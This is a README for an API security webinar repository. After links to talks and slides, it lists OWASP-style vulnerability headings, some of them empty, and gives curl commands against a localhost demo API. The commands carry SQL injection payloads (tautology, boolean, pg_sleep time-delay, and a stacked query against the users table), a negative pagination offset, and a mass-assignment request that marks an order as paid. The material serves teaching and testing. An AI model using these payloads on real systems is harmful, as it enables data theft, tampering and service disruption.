# API Security and 'Security by Design' practices

Welcome 👋

This repository stores assets related to webinars demonstrating secure-by-design practices for APIs, and how security concerns can be applied across the API lifecycle.

The two-part webinar series are broken down as follows:
 - Part I: covers the theoretical aspects of API security (covering the **what/why** of API security, the **2023 OWASP Top 10 Risks for APIs**, common **design vulnerability** pitfalls, and more..). Assets from the webinar are as follows:
    - [YouTube Recording](https://www.youtube.com/watch?v=acXpD1tRmCQ)
    - [Slides](https://assets.smartbear.com/transfer/388708a6e1980ed76ed7a194110d44f95c49790b294da03aa5906aea28806ce1)
    - [2023 OWASP Top 10 Snippet Videos](https://www.youtube.com/playlist?list=PLrA5ciulugn8nydmfvt9cGBgDFqg8XbEt)
 - Part II: covers a hands-on walkthrough how to apply some of the learnings from part I throughout the API lifecycle. The majority of assets in this repository relate to the hands-on part II.

## Part II - Context and Instructions.....


## Vulnerabilities

### Broken Authentication
### Unrestricted Resource Consumption
### BOPLA - Excessive Data Exposure
### BOLA - Excessive Data Exposure
### PAGINATION ATTACK

```bash
curl -X 'GET' \
  'http://localhost:8000/books?offset=-1' \
  -H 'accept: application/json'
```

### BOLA - SQL INJECTION

```bash
curl -X 'GET' \
  'http://localhost:8000/books?status=%27%20OR%201%3D1--' \
  -H 'accept: application/json'
```

```bash
curl -X 'GET' \
  'http://localhost:8000/rides?status=%27%20OR%20%28CASE%20WHEN%20%281%3D1%29%20THEN%20%28SELECT%201%20%3D%201%29%20ELSE%20%28SELECT%201%20%3D%200%29%20END%29--' \
  -H 'accept: application/json'
```

### SQL INJECTION

Resource starvation

```bash
curl -X 'GET' \
  'http://localhost:8000/rides?status=%27%20AND%203133%3D%28SELECT%203133%20FROM%20PG_SLEEP%2810%29%29--' \
  -H 'accept: application/json'
```

### BOPLA - Mass Assignment - Exposing Server-Side properties in User Input

```bash
curl -X 'PUT' \
  'http://localhost:8000/orders/1' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "destination": "hahaha",
  "pickup_time": "2023-10-22T20:15:10.029Z",
  "status": "paid"
}'
```

### DATA CORRUPTION ATTACK - Merging models with optional properties

```bash
curl -X 'POST' \
  'http://localhost:8000/books' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "format": "ebook",
  "author": "Author",
  "title": "Book",
  "description": "string",
  "price": 10,
  "pages": 100
}'
```

### BOLA - Excessive Data Exposure


### - SECURITY MISCONFIGURATION

Leak database traces through the payload (implementation). In debug mode:

```bash
curl -X 'GET' \
  'http://localhost:8000/books?filter=%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20users%3B%20--' \
  -H 'accept: application/json'
```
